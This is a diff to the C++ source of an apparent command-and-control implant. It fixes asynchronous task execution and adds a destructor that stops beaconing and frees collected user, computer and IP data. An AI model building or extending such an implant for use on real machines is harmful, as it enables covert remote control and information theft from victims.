@@ -177,8 +177,6 @@ STATUS_CODE Implant::sendData(const json& data, const std::string& endpoint) {
 
 
 
-
-
 void Implant::RegisterImplant()
 {
 	json registrationData = {
@@ -255,14 +253,32 @@ void Implant::FetchTasks() {
 
 
             if (std::find(executedTaskIds.begin(), executedTaskIds.end(), task.taskId) == executedTaskIds.end()) { // If not found in the executed tasks ... 
-                std::async(std::launch::async, &Implant::executeTask, this, task); // Then we launch this thread, then we push the taskID into the executedTaskIds.
-                executedTaskIds.push_back(task.taskId); // then push it onto the taskIds that are executed.
+                auto f = std::async(std::launch::async, &Implant::executeTask, this, task); // Then we launch this thread, then we push the taskID into the executedTaskIds.
+                
+                if (f.valid()) {
+                    executedTaskIds.push_back(task.taskId); // then push it onto the taskIds that are executed.
+                }
+
+                else {
+					std::cout << "ERROR: Task not valid" << std::endl;
+                }
             }
         }
 
         tasks.clear(); // Don't run it again after we finish running the tasks!
     }
 }
+
+Implant::~Implant() {
+	StopBeacon();
+
+	delete[] basicUserInfo.UserName;
+	delete[] basicUserInfo.ComputerName;
+	delete[] basicUserInfo.Ip;
+	delete basicUserInfo.osvi;
+
+}
+
 
 void Implant::parseTasks(const json& response) {
     for (const auto& taskJson : response) {
